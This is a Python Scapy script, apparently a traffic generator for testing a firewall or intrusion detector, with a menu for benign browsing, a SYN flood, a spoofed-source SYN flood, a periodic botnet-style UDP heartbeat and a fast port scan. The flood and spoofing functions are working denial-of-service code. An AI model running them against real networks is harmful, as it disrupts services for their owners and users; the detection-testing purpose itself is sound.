import time
import random
import sys
from scapy.all import IP, TCP, UDP, send, RandIP

# 🎯 CONFIGURATION
# ------------------------------------------------------
# IP of the machine running the firewall (Or Gateway)
TARGET_IP = "192.168.1.1" 
# ------------------------------------------------------

def benign_traffic():
    print("\n[😇] Simulating BENIGN User Behavior...")
    print("    Pattern: Random intervals, HTTP-like bursts")
    
    # Simulate a user browsing a website (bursts of traffic)
    for i in range(50):
        # HTTP is usually Port 80 or 443
        dst_port = random.choice([80, 443, 8080])
        pkt_size = random.randint(500, 1500) # Big packets (Data)
        
        # Payload (simulating data)
        payload = "X" * pkt_size
        
        pkt = IP(dst=TARGET_IP)/TCP(dport=dst_port, flags="PA") / payload
        send(pkt, verbose=0)
        
        # Human behavior: Random waits between clicks (0.1s to 2.0s)
        wait_time = random.uniform(0.1, 2.0)
        print(f"    User clicked link... (Sent {pkt_size} bytes, wait {wait_time:.2f}s)")
        time.sleep(wait_time)

def dos_flood():
    print("\n[💣] Launching DoS FLOOD (Single Source)...")
    print("    Pattern: High volume, Zero variance, Fixed Source")
    
    # DoS = Zero sleep, maximum speed
    count = 0
    try:
        while True:
            # Fixed port (e.g., flooding a web server)
            pkt = IP(dst=TARGET_IP)/TCP(dport=80, flags="S")
            send(pkt, verbose=0)
            count += 1
            if count % 100 == 0:
                print(f"    🔥 Sent {count} packets (Ctrl+C to stop)")
            # No sleep!
    except KeyboardInterrupt:
        print("\n[🛑] DoS Stopped.")

def ddos_simulation():
    print("\n[🧟] Launching DDoS ATTACK (Spoofed Sources)...")
    print("    Pattern: Multiple random Source IPs, High volume")
    
    # DDoS = Randomize Source IP (Spoofing)
    count = 0
    try:
        while True:
            # IP(src=RandIP()) creates a random Source IP for every packet
            pkt = IP(src=RandIP(), dst=TARGET_IP)/TCP(dport=80, flags="S")
            send(pkt, verbose=0)
            count += 1
            if count % 100 == 0:
                print(f"    ☠️  Sent {count} spoofed packets")
            # Tiny sleep to prevent crashing your own router
            time.sleep(0.001) 
    except KeyboardInterrupt:
        print("\n[🛑] DDoS Stopped.")

def botnet_c2():
    print("\n[🤖] Simulating BOTNET C2 Heartbeat...")
    print("    Pattern: Periodic, Fixed size, Regular intervals")
    
    # Botnets often "phone home" exactly every X seconds
    try:
        while True:
            pkt = IP(dst=TARGET_IP)/UDP(dport=6667) # IRC/C2 port
            send(pkt, verbose=0)
            print("    🤖 Heartbeat sent to C2 Server...")
            
            # The "Dead Giveaway": Exact 1.0 second sleep
            time.sleep(1.0) 
    except KeyboardInterrupt:
        print("\n[🛑] Botnet Stopped.")

def port_scan():
    print("\n[🔍] Scanning Ports...")
    print("    Pattern: Random Destination Ports, Fast")
    
    for i in range(100):
        dst_port = random.randint(20, 1024)
        pkt = IP(dst=TARGET_IP)/TCP(dport=dst_port, flags="S")
        send(pkt, verbose=0)
        print(f"    🔫 Scanning port {dst_port}")
        time.sleep(0.02) # Very fast

# ================= MENU =================
if __name__ == "__main__":
    print("-" * 40)
    print("      ⚔️  CYBER ATTACK SIMULATOR  ⚔️")
    print("-" * 40)
    print("1. Benign Traffic (Normal User)")
    print("2. DoS Attack (Flooding)")
    print("3. DDoS Attack (Spoofed IPs)")
    print("4. Botnet Activity (C2 Heartbeat)")
    print("5. Port Scan (Reconnaissance)")
    print("-" * 40)
    
    choice = input("Select Attack Vector (1-5): ")
    
    if choice == '1': benign_traffic()
    elif choice == '2': dos_flood()
    elif choice == '3': ddos_simulation()
    elif choice == '4': botnet_c2()
    elif choice == '5': port_scan()
    else: print("❌ Invalid selection")